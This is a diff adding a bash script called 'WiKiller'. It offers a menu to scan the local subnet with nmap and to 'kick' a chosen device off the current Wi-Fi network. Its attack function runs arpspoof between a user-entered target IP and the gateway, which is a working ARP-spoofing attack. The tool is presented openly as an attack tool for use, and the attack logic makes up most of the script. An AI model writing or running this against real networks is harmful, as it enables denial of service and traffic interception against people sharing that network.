@@ -1,0 +1,89 @@
+#!/bin/bash
+#Colors
+cyan='\e[0;36m'
+green='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[0;33m'
+blue='\e[1;34m'
+RESET="\033[00m" 
+orange='\e[38;5;166m'
+interface=""
+definterface="wlan0"
+currentnetwork=$(iwgetid -r)
+tip=""
+gateway=$(/sbin/ip route | awk '/default/ { print $3 }')
+
+
+function bar (){
+    echo -e "\n"
+    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
+}
+function main (){
+	clear
+	interface='wlan0'
+	echo -e "\n\n\n $green"
+	echo -e "              ================================================"
+	echo -e "              =  __      __ __   .__.__. .__.                ="                
+	echo -e "              = /  \    /  \  | _|__|  | |  |   ___________  =" 
+	echo -e "              = \   \/\/   /  |/ /  |  | |  | _/ __ \_  __ \ ="
+	echo -e "              =  \        /|    <|  |  |_|  |_\  ___/|  | \/ ="
+	echo -e "              =   \__/\  / |__|_ \__|____/____/\___  >__|    ="
+	echo -e "              =        \/       \/                 \/        ="
+	echo -e "              ================================================"
+	echo -e "              = $red               Made By @P3rl4         $green       ="
+	echo -e $green"              ================================================"
+
+	echo -e "$RESET"
+	menu
+}
+function menu (){
+	echo -e $red"              1- Scan Devices (nmap)"
+	echo -e $red"              2- Kick Device From network SSID:'$currentnetwork'"
+	echo -e $red"              3- Exit"
+	echo -e $red"\n\n"
+	read -p "─────► " choice1
+	if [[ $choice1 == 1 ]]; then
+		bar
+		scan
+		main
+	elif [[ $choice1 == 2 ]]; then
+		remv
+	elif [[ $choice1 == 3 ]]; then
+		clear
+		resize -s 24 80 > /dev/null
+		exit 0;
+	else
+		main
+	fi
+}
+function scan (){
+	gnome-terminal -- /bin/bash -c 'resize -s 14 64 > /dev/null; echo -e "\e[0;33m"; nmap -sn 192.168.1.0/24 && echo -e "\e[1;32m \n\nHit enter when finished..."; read' > /dev/null
+}
+function remv (){
+	bar
+	clear
+	echo -e "\n\n"
+	echo -ne $green"Select Interface $blue(default wlan0)";echo -ne "$RESET"
+	read -p ":" interface
+	echo -ne $green"Select target IP";echo -ne "$RESET"
+	read -p ":" tip
+	clear
+	interface=${1:-$definterface} 
+	export gateway
+	export tip
+	export interface
+	echo -e $blue"             \n\n\n Press ctrl-c to end Attack"
+	xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T $tip -e 'arpspoof -i "$interface" -t "$tip" -r "$gateway"'
+	main
+}
+resize -s 30 76 > /dev/null
+main
